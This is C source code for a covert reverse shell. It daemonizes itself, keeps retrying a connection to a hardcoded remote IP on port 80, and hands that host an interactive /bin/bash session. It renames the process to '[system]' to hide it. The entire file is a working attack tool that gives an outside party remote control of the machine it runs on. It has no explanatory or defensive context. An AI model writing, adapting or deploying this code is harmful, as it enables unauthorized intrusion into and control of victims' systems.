#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <signal.h>

#define REC_TIMEOUT 3
#define BUFFER 4096

void DieWithError(char *msg);

int main(int arg, char **argv[])
{
	int sock;
	unsigned short server_port = 80;
	//char server_ip[] = "130.211.102.76"; 
	char server_ip[] = "10.200.158.44"; 
	char shell[] = "/bin/bash";
	char fakename[] = "[system]", welcome_msg[BUFFER]; 
	struct sockaddr_in server_addr;
	pid_t PID, parent_PID;

	// Create child and auto kill parent 
	if((PID = fork()) < 0)
		DieWithError("fork() failed!\n");
	else if(PID == 0){

		parent_PID = getpid();
		printf("child_PID %d\n", parent_PID);

		// Open socket
		if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
			DieWithError("socket() filed!\n");

		// Fill aerver_addr structure with vars
		memset(&server_addr, 0, sizeof(server_addr));
		server_addr.sin_family = AF_INET;
		server_addr.sin_addr.s_addr = inet_addr(server_ip);
		server_addr.sin_port = htons(server_port);

		// Connect to server via socket, retry if there is no connection
		while(1){
			if(connect(sock, (struct sockaddr*) &server_addr, sizeof(server_addr)) >= 0)
				break;

			sleep(REC_TIMEOUT);
		}

		// Make session owner, change working dir to "/" 
		// and remove old permissions
		setsid();
		chdir("/");
		umask(0);

		// Redirect all (input, output and error) to socket
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		
		// Make and print status message
		memset(welcome_msg, 0, sizeof(welcome_msg));
		sprintf(welcome_msg, "Welcome USER=%s PATH=%s", getenv("USER"), getenv("HOME"));
		fprintf(stderr, "\n %s \n", welcome_msg);

		// Execute local shell
		execl(shell, fakename, "-i", NULL);

		// Close socket
		close(sock);
	}

	return 0;

}

// Error notifier
void DieWithError(char *msg)
{
	perror(msg);
	exit(1);
}
